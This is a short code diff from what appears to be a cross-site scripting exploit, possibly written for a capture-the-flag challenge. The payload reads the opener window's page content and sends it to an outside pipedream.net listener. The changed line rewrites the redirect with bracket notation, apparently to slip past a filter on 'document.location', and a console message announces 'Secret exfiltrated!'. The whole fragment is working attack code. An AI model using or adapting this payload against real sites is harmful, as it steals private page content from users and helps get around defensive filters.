@@ -35,7 +35,7 @@
             "setTimeout(function() {" +                   
                     // 2. Encode le secret pour l'URL
                     "var encodedSecret = window.opener.document.body.innerHTML;" +
-                    "document.location = `https://eotoci65n24zl7e.m.pipedream.net/?secret=${encodeURIComponent(encodedSecret)}`;" +
+                    "window['location']['href']= `https://eotoci65n24zl7e.m.pipedream.net/?secret=${encodeURIComponent(encodedSecret)}`;" +
                     
                     "console.log('Secret exfiltrated! Check your listener logs.');" +
             "}, 1000);</script>";
